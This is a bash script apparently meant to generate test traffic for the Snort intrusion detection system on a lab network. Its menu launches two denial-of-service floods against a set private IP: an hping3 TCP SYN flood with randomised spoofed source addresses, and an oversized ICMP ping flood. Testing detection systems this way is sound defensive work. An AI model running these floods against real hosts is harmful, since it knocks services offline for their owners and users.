#!/bin/bash

# simulation_attack.sh - A script to simulate network attacks for Snort testing

# Target IP (replace with your target machine’s IP address)
TARGET_IP="192.168.23.129"

# Network Interface (replace with your network interface, e.g., eth0 or ens33)
INTERFACE="ens33"

# Function to perform a TCP SYN flood attack using hping3
function tcp_syn_flood() {
    echo "Starting TCP SYN flood attack on $TARGET_IP at port 80..."
    hping3 -S -p 80 --flood --rand-source $TARGET_IP
    echo "TCP SYN flood attack completed."
}

# Function to perform an ICMP ping flood attack
function icmp_flood() {
    echo "Starting ICMP ping flood attack on $TARGET_IP..."
    ping -f -s 65500 $TARGET_IP
    echo "ICMP ping flood attack completed."
}

# Display the attack options
echo "Select an attack to simulate:"
echo "1) TCP SYN flood attack"
echo "2) ICMP ping flood attack"
echo "3) Exit"

# Read user selection
read -p "Enter your choice [1-3]: " choice

# Execute the selected attack
case $choice in
    1)
        tcp_syn_flood
        ;;
    2)
        icmp_flood
        ;;
    3)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo "Invalid option. Exiting."
        exit 1
        ;;
esac
